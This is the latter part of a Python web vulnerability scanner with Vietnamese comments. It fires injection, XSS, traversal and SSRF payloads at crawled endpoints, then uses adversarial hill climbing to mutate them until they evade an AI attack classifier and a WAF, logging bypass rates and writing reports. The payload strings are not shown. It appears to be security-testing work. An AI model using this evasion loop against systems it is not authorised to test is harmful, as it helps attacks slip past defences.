                            'strategy_chain': best_strategy,
                            'rounds': rounds_used,
                            'time': mutation_time,
                        })

            # ---- Fire original ----
            t_fire = time.time()
            result = self.attack_endpoint(ep, attack_type, payload)
            fire_time = time.time() - t_fire
            result.update({
                'original_confidence': orig_conf,
                'oracle_detected': detected,
                'model_label': orig_label,
            })
            
            with self._stats_lock:
                self.attack_logger.log(
                    original_payload=payload,
                    mutated_payload=payload,
                    mutation_type='original',
                    attempt_number=0,
                    detected_by='ai' if detected else 'none',
                    result='blocked' if result.get('status_code') in (403, 429) else 'bypass',
                    response_time=fire_time,
                )

            # ---- Fire evasive payload ----
            if mutation_result and best_payload != payload:
                t_fire2 = time.time()
                evasive_result = self.attack_endpoint(ep, attack_type, best_payload)
                fire_time2 = time.time() - t_fire2
                status = evasive_result.get('status_code')
                waf_blocked = status in (403, 429)
                evasive_result.update({
                    'original_confidence': orig_conf,
                    'evasive_confidence': mutation_result['final_confidence'],
                    'mutation_strategy': best_strategy,
                    'mutation_rounds': rounds_used,
                    'model_evaded': model_evaded,
                    'waf_blocked': waf_blocked,
                })
                
                with self._stats_lock:
                    self.scan_results.append(evasive_result)
                    if evasive_result.get('is_vulnerable'):
                        self.vulnerabilities.append(evasive_result)
                    self.attack_logger.log(
                        original_payload=payload,
                        mutated_payload=best_payload,
                        mutation_type=best_strategy,
                        attempt_number=rounds_used,
                        detected_by='rule' if waf_blocked else ('ai' if not model_evaded else 'none'),
                        result='blocked' if waf_blocked else 'bypass',
                        response_time=fire_time2,
                    )
                
                if model_evaded and not waf_blocked:
                    print(f"    {Color.MAGENTA}BYPASS [{best_strategy}] "
                          f"conf {orig_conf:.0f}%->{mutation_result['final_confidence']:.0f}% "
                          f"({rounds_used} rounds, {mutation_time:.2f}s){Color.END}")
                elif model_evaded and waf_blocked:
                    print(f"    {Color.YELLOW}MODEL WEAK [{best_strategy}] "
                          f"evaded model but WAF rule caught it{Color.END}")

            return result

        # ---- Build task list ----
        tasks = []
        for ep in self.endpoints:
            for attack_type, static_payloads in self._attack_payloads.items():
                for payload in static_payloads:
                    tasks.append((ep, attack_type, payload))

        total_tests = len(tasks)
        print(f"\n{Color.RED}[Phase 2] ⚡ Adversarial Hill Climbing — "
              f"{total_tests} tasks | {MAX_WORKERS} threads{Color.END}")

        # ---- Execute với ThreadPoolExecutor ----
        completed = 0
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(attack_single, task): task for task in tasks}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.warning(f"Task error: {e}")
                completed += 1
                if completed % 20 == 0:
                    print(f"  {Color.CYAN}[{completed}/{total_tests}] đang quét...{Color.END}")

        # ---- Per-endpoint summary ----
        for ep in self.endpoints:
            ep_vulns = [v for v in self.vulnerabilities
                       if v.get('endpoint') == ep['url'] and v.get('param') == ep['param']]
            path = urlparse(ep['url']).path
            if ep_vulns:
                print(f"  {Color.RED}!! {path}?{ep['param']} — {len(ep_vulns)} lỗ hổng{Color.END}")
            else:
                print(f"  {Color.GREEN}OK {path}?{ep['param']} — an toàn{Color.END}")

        # ---- Compute final security metrics ----
        stats = self.adv_stats
        if stats['model_detected'] > 0:
            stats['bypass_rate'] = stats['evasions_found'] / stats['model_detected'] * 100
        if stats['total_original'] > 0:
            stats['attack_success_rate'] = len(self.vulnerabilities) / stats['total_original'] * 100

        print(f"\n  Tổng: {total_tests} payloads | "
              f"{Color.RED}{len(self.vulnerabilities)} lỗ hổng{Color.END} phát hiện")


    # ----- Phase 3: Tạo báo cáo -----
    def print_report(self):
        """In báo cáo tổng hợp ra terminal"""
        print(f"""
{Color.CYAN}{Color.BOLD}
╔══════════════════════════════════════════════════════╗
║           📋 BÁO CÁO QUÉT LỖ HỔNG                  ║
╚══════════════════════════════════════════════════════╝
{Color.END}""")

        duration = (self.end_time - self.start_time)
        print(f"  🎯 Target:     {self.target_url}")
        print(f"  ⏱️  Thời gian:  {duration:.1f} giây")
        print(f"  🔢 Endpoints:  {len(self.endpoints)}")
        print(f"  📦 Payloads:   {len(self.scan_results)}")
        print(f"  🔴 Lỗ hổng:    {len(self.vulnerabilities)}")

        if not self.vulnerabilities:
            print(f"\n  {Color.GREEN}{Color.BOLD}✅ KHÔNG TÌM THẤY LỖ HỔNG NÀO!{Color.END}")
        else:
            # Nhóm theo loại
            vuln_by_type = {}
            for v in self.vulnerabilities:
                t = v['attack_type']
                if t not in vuln_by_type:
                    vuln_by_type[t] = []
                vuln_by_type[t].append(v)

            print(f"\n  {Color.RED}{Color.BOLD}⚠️  PHÁT HIỆN {len(self.vulnerabilities)} LỖ HỔNG:{Color.END}")

            severity_map = {
                "SQLi": "🔴 CRITICAL",
                "Command Injection": "🔴 CRITICAL",
                "XSS": "🟠 HIGH",
                "Path Traversal": "🟠 HIGH",
                "SSRF": "🟠 HIGH",
                "CSRF": "🟡 MEDIUM",
            }

            for attack_type, vulns in vuln_by_type.items():
                severity = severity_map.get(attack_type, "🟡 MEDIUM")
                print(f"\n  {Color.BOLD}━━━ {severity} — {attack_type} ({len(vulns)} phát hiện) ━━━{Color.END}")

                affected = set()
                for v in vulns:
                    affected.add(f"{v['method']} {urlparse(v['endpoint']).path}?{v['param']}")

                print(f"  Endpoints bị ảnh hưởng: {', '.join(list(affected)[:3])}...")

                for ep_str in list(affected)[:2]:
                    print(f"    📍 Endpoint: {Color.YELLOW}{ep_str}{Color.END}")

                # Hiện 1-2 payload mẫu
                print(f"    💣 Payload mẫu:")
                for v in vulns[:2]:
                    print(f"       • {v['payload'][:60]}")
                    if v['evidence']:
                        print(f"         └─ {v['evidence'][0][:60]}")

        # Điểm số an toàn
        total_endpoints = len(self.endpoints)
        vuln_endpoints = len(set(
            f"{v['endpoint']}|{v['param']}" for v in self.vulnerabilities
        ))
        safe_endpoints = total_endpoints - vuln_endpoints
        if total_endpoints > 0:
            score = (safe_endpoints / total_endpoints) * 100
        else:
            score = 100

        print(f"\n  {Color.BOLD}📊 ĐIỂM AN TOÀN: ", end="")
        if score >= 80:
            print(f"{Color.GREEN}{score:.0f}/100{Color.END}")
        elif score >= 50:
            print(f"{Color.YELLOW}{score:.0f}/100{Color.END}")
        else:
            print(f"{Color.RED}{score:.0f}/100{Color.END}")

        print(f"     • Endpoint an toàn: {safe_endpoints}/{total_endpoints}")
        print(f"     • Endpoint có lỗi:  {vuln_endpoints}/{total_endpoints}")

        # === SECURITY METRICS ===
        stats = self.adv_stats
        total = stats['total_original']
        detected = stats['model_detected']
        mutations = stats['mutations_tried']
        evasions = stats['evasions_found']
        
        if total > 0:
            print(f"\n{Color.MAGENTA}{Color.BOLD}=== SECURITY METRICS ==={Color.END}")
            print(f"  Payloads goc:            {total}")
            print(f"  Model detected:          {detected} ({detected/total*100:.1f}%)")
            print(f"  Mutation rounds:         {mutations}")
            print(f"  Evasions thanh cong:     {evasions}")

            # Bypass Rate
            bypass_rate = stats['bypass_rate']
            print(f"\n  {Color.BOLD}Bypass Rate:{Color.END}           ", end="")
            if bypass_rate > 30:
                print(f"{Color.RED}{bypass_rate:.1f}%{Color.END} (model can retrain)")
            elif bypass_rate > 10:
                print(f"{Color.YELLOW}{bypass_rate:.1f}%{Color.END}")
            else:
                print(f"{Color.GREEN}{bypass_rate:.1f}%{Color.END}")

            # Attack Success Rate
            asr = stats['attack_success_rate']
            print(f"  {Color.BOLD}Attack Success Rate:{Color.END}   {asr:.1f}%")

            # Time to Bypass
            if stats['time_to_bypass_list']:
                avg_time = sum(stats['time_to_bypass_list']) / len(stats['time_to_bypass_list'])
                print(f"  {Color.BOLD}Avg Time to Bypass:{Color.END}    {avg_time:.3f}s")

            # Rounds to Bypass
            if stats['rounds_to_bypass_list']:
                avg_rounds = sum(stats['rounds_to_bypass_list']) / len(stats['rounds_to_bypass_list'])
                print(f"  {Color.BOLD}Avg Rounds to Bypass:{Color.END}  {avg_rounds:.1f} rounds")

            # Top Mutation Strategies
            if stats['mutation_effectiveness']:
                print(f"\n  {Color.BOLD}Top Mutation Strategies:{Color.END}")
                sorted_m = sorted(stats['mutation_effectiveness'].items(), key=lambda x: x[1], reverse=True)
                for strategy, count in sorted_m[:5]:
                    print(f"     {strategy}: {count} lan hieu qua")

            # Insight: model_evaded vs waf_blocked
            model_evaded_waf_blocked = sum(1 for r in self.scan_results if r.get('model_evaded') and r.get('waf_blocked'))
            model_evaded_waf_pass = sum(1 for r in self.scan_results if r.get('model_evaded') and not r.get('waf_blocked'))
            
            print(f"\n  {Color.BOLD}DEFENSE LAYER ANALYSIS:{Color.END}")
            print(f"     model_evaded + waf_blocked: {model_evaded_waf_blocked} (Rule-based cuu khi AI miss)")
            print(f"     model_evaded + waf_passed:  {model_evaded_waf_pass} (BYPASS HOAN TOAN)")

            # Bypass Payload Log
            if stats['bypass_payloads']:
                print(f"\n  {Color.BOLD}=== BYPASS PAYLOAD LOG ==={Color.END}")
                for i, bp in enumerate(stats['bypass_payloads'][:5], 1):
                    print(f"  #{i} [{bp['attack_type']}] "
                          f"conf {bp['conf_original']:.0f}%->{bp['conf_final']:.0f}% "
                          f"via {bp['strategy_chain']} ({bp['rounds']} rounds)")
                    print(f"     Original: {bp['original'][:60]}")
                    print(f"     Bypassed: {bp['bypassed'][:60]}")

            # SQLite attack log summary
            db_stats = self.attack_logger.get_total_stats()
            top_mutations = self.attack_logger.get_top_mutations(3)
            print(f"\n  {Color.BOLD}=== ATTACK LOG DB ==={Color.END}")
            print(f"     Total records:    {db_stats['total']}")
            print(f"     Bypassed:         {db_stats['bypassed']}")
            print(f"     Blocked:          {db_stats['blocked']}")
            print(f"     DB Bypass Rate:   {db_stats['bypass_rate']:.1f}%")
            print(f"     Avg Response:     {db_stats['avg_response_time']:.4f}s")
            if top_mutations:
                print(f"     Top mutations (DB):")
                for mut_type, cnt in top_mutations:
                    print(f"       {mut_type}: {cnt} bypasses")

    def save_report(self, output_path=None):
        """Lưu báo cáo ra file JSON + Markdown"""
        if output_path is None:
            output_path = os.path.dirname(os.path.abspath(__file__))

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # JSON report
        json_path = os.path.join(output_path, f"scan_report_{timestamp}.json")
        report_data = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'duration_seconds': round(self.end_time - self.start_time, 2),
            'total_endpoints': len(self.endpoints),
            'total_payloads_sent': len(self.scan_results),
            'total_vulnerabilities': len(self.vulnerabilities),
            'endpoints': self.endpoints,
            'vulnerabilities': self.vulnerabilities,
        }
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        # Markdown report
        md_path = os.path.join(output_path, f"scan_report_{timestamp}.md")
        duration = self.end_time - self.start_time

        vuln_by_type = {}
        for v in self.vulnerabilities:
            t = v['attack_type']
            if t not in vuln_by_type:
                vuln_by_type[t] = []
            vuln_by_type[t].append(v)

        severity_map = {
            "SQLi": "🔴 CRITICAL",
            "Command Injection": "🔴 CRITICAL",
            "XSS": "🟠 HIGH",
            "Path Traversal": "🟠 HIGH",
            "SSRF": "🟠 HIGH",
            "CSRF": "🟡 MEDIUM",
        }

        md = f"""#  BÁO CÁO QUÉT LỖ HỔNG — MODULE 1

**Ngày quét:** {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
**Target:** `{self.target_url}`
**Thời gian quét:** {duration:.1f} giây
**Engine:** AI Bi-LSTM + Rule-Based Signatures

---

## 📊 Tổng quan

| Metric | Giá trị |
|--------|---------|
| Endpoints quét | {len(self.endpoints)} |
| Payloads đã gửi | {len(self.scan_results)} |
| **Lỗ hổng phát hiện** | **{len(self.vulnerabilities)}** |

---

## ⚠️ Chi tiết lỗ hổng

"""
        if not self.vulnerabilities:
            md += "> ✅ **Không tìm thấy lỗ hổng nào!**\n"
        else:
            for attack_type, vulns in vuln_by_type.items():
                severity = severity_map.get(attack_type, "🟡 MEDIUM")
                md += f"### {severity} — {attack_type}\n\n"

                affected = set()
                for v in vulns:
                    affected.add(f"`{v['method']} {urlparse(v['endpoint']).path}?{v['param']}`")

                md += f"**Endpoints bị ảnh hưởng:** {', '.join(affected)}\n\n"
                md += "| Payload | Evidence | AI Classification |\n"
                md += "|---------|----------|--------------------|\n"
                for v in vulns[:5]:
                    ev = v['evidence'][0][:40] if v['evidence'] else "—"
                    md += f"| `{v['payload'][:40]}` | {ev} | {v['ai_classification']} ({v['ai_confidence']:.0f}%) |\n"
                md += "\n---\n\n"

        # Score
        total_ep = len(self.endpoints)
        vuln_ep = len(set(f"{v['endpoint']}|{v['param']}" for v in self.vulnerabilities))
        score = ((total_ep - vuln_ep) / total_ep * 100) if total_ep > 0 else 100
        md += f"\n## 📊 Điểm an toàn: **{score:.0f}/100**\n"

        with open(md_path, 'w', encoding='utf-8') as f:
            f.write(md)

        print(f"\n  💾 Báo cáo đã lưu:")
        print(f"     • JSON: {json_path}")
        print(f"     • MD:   {md_path}")
        return json_path, md_path

    # ----- CHẠY SCAN TOÀN BỘ -----
    def run(self, save_report=False):
        """Chạy toàn bộ quy trình scan"""
        self.banner()
        self.start_time = time.time()


        # Phase 1: Crawl
        if not self.crawl_target():
            print(f"\n{Color.RED}❌ Không tìm được endpoint nào. Dừng scan.{Color.END}")
            return

        # Phase 2: Attack
        self.run_attacks()

        self.end_time = time.time()

        # Phase 3: Report
        self.print_report()

        if save_report:
            self.save_report()

        return self.vulnerabilities


# ===== FLASK API SERVER MODE =====
def create_api_server():
    """Tạo Flask server để HTML frontend gọi scan qua API"""
    from flask import Flask, request as flask_request, jsonify, send_file
    from flask_cors import CORS

    api = Flask(__name__)
    CORS(api)

    # Pre-load AI engine 1 lần
    shared_ai = AIEngine()
    shared_ai.load()

    @api.route('/')
    def serve_ui():
        """Serve giao diện HTML"""
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ai_waf_scanner.html')
        return send_file(html_path)

    @api.route('/api/health', methods=['GET'])
    def health():
        return jsonify({
            'status': 'operational',
            'ai_engine': shared_ai.loaded,
            'timestamp': datetime.now().isoformat()
        })

    @api.route('/api/scan', methods=['POST'])
    def api_scan():
        """API scan — nhận target URL, trả kết quả JSON"""
        data = flask_request.get_json()
        if not data or 'target' not in data:
            return jsonify({'error': 'Thiếu trường "target" trong request body'}), 400

        target_url = data['target'].strip()
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url

        logger.info(f" API Scan requested: {target_url}")

        try:
            scanner = VulnerabilityScanner(target_url)
            scanner.ai = shared_ai  # Dùng chung AI engine đã load
            scanner.start_time = time.time()

            # Phase 1: Crawl
            if not scanner.crawl_target():
                return jsonify({
                    'error': 'Không tìm thấy endpoint nào trên trang',
                    'target': target_url
                }), 404

            # Phase 2: Attack
            scanner.run_attacks()

            scanner.end_time = time.time()
            duration = scanner.end_time - scanner.start_time

            # Phase 3: Build response
            severity_map = {
                "SQLi": "CRITICAL",
                "Command Injection": "CRITICAL",
                "XSS": "HIGH",
                "Path Traversal": "HIGH",
                "SSRF": "HIGH",
                "CSRF": "MEDIUM",
            }

            vuln_by_type = {}
            for v in scanner.vulnerabilities:
                t = v['attack_type']
                if t not in vuln_by_type:
                    vuln_by_type[t] = []
                vuln_by_type[t].append(v)

            total_ep = len(scanner.endpoints)
            vuln_ep = len(set(f"{v['endpoint']}|{v['param']}" for v in scanner.vulnerabilities))
            score = int(((total_ep - vuln_ep) / total_ep * 100)) if total_ep > 0 else 100

            # Lưu báo cáo lỗi cho Feedback Loop (AI Agent fix)
            report_path = None
            if scanner.vulnerabilities:
                report_path = scanner.save_report()

            result = {
                'target': target_url,
                'duration': round(duration, 1),
                'total_endpoints': total_ep,
                'total_payloads': len(scanner.scan_results),
                'total_vulnerabilities': len(scanner.vulnerabilities),
                'score': score,
                'endpoints': scanner.endpoints,
                'vulnerabilities_by_type': {},
                'report_files': report_path,
            }

            for attack_type, vulns in vuln_by_type.items():
                affected = list(set(
                    f"{v['method']} {urlparse(v['endpoint']).path}?{v['param']}"
                    for v in vulns
                ))
                result['vulnerabilities_by_type'][attack_type] = {
                    'severity': severity_map.get(attack_type, 'MEDIUM'),
                    'count': len(vulns),
                    'affected_endpoints': affected,
                    'samples': [
                        {
                            'payload': v['payload'],
                            'evidence': v['evidence'][:2] if v['evidence'] else [],
                            'ai_label': v['ai_classification'],
                            'ai_confidence': round(v['ai_confidence'], 1),
                        }
                        for v in vulns[:5]
                    ]
                }

            logger.info(f"✅ Scan hoàn tất: {len(scanner.vulnerabilities)} lỗ hổng, {duration:.1f}s")
            return jsonify(result)
            
        except Exception as e:
            import traceback
            logger.error(f"❌ Exception in /api/scan: {str(e)}")
            logger.error(traceback.format_exc())
            return jsonify({
                'error': f'Internal server error: {str(e)}',
                'details': traceback.format_exc()
            }), 500

    return api


# ===== MAIN =====
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description=' AI Vulnerability Scanner — Module 1'
    )
    parser.add_argument(
        '--target', '-t',
        default=None,
        help='URL web mục tiêu cần quét (ví dụ: http://localhost:5173)'
    )
    parser.add_argument(
        '--report', '-r',
        action='store_true',
        help='Lưu báo cáo ra file (JSON + Markdown)'
    )
    parser.add_argument(
        '--server', '-s',
        action='store_true',
        help='Chạy chế độ Web Server (API + giao diện HTML)'
    )
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=5001,
        help='Port cho Web Server (mặc định: 5001)'
    )
    parser.add_argument(
        '--loop', '-l',
        action='store_true',
        help='Chế độ giám sát liên tục (quét lặp lại sau mỗi khoảng nghỉ)'
    )
    args = parser.parse_args()

    if args.server:
        # CHẾ ĐỘ WEB SERVER: Bản thân nó đã chạy liên tục chờ request từ UI
        app = create_api_server()
        logger.info(f" Module 1 Web UI đang chạy tại: http://127.0.0.1:{args.port}")
        app.run(debug=False, port=args.port, threaded=True)
    else:
        # CHẾ ĐỘ CLI (Dòng lệnh)
        target = args.target
        while not target:
            print(f"{Color.CYAN} Vui lòng nhập URL mục tiêu: {Color.END}", end="")
            target = input().strip()
            if target and not target.startswith('http'):
                target = 'http://' + target

        if args.loop:
            print(f"{Color.GREEN} BẮT ĐẦU CHẾ ĐỘ GIÁM SÁT LIÊN TỤC TRÊN: {target}{Color.END}")
            print(f"{Color.YELLOW}Nhấn Ctrl+C để dừng hệ thống.{Color.END}\n")
            try:
                scanner = VulnerabilityScanner(target)
                while True:
                    scanner.run(save_report=args.report)
                    print(f"\n{Color.BLUE} Hoàn tất chu kỳ quét. Nghỉ 60 giây trước khi quét lại...{Color.END}")
                    time.sleep(60)
            except KeyboardInterrupt:
                print(f"\n{Color.RED} Đã dừng giám sát.{Color.END}")
        else:
            # KỊCH BẢN QUÉT 1 LẦN RỒI HỎI
            scanner = VulnerabilityScanner(target)
            while True:
                scanner.run(save_report=args.report)
                print(f"\n{Color.YELLOW} Bạn có muốn quét lại hoặc thử URL khác không? (y/n): {Color.END}", end="")
                choice = input().lower().strip()
                if choice != 'y':
                    break
                print(f"{Color.CYAN}👉 Nhập URL mới (để trống để dùng lại URL cũ): {Color.END}", end="")
                new_target = input().strip()
                if new_target:
                    if not new_target.startswith('http'):
                        new_target = 'http://' + new_target
                    scanner = VulnerabilityScanner(new_target)
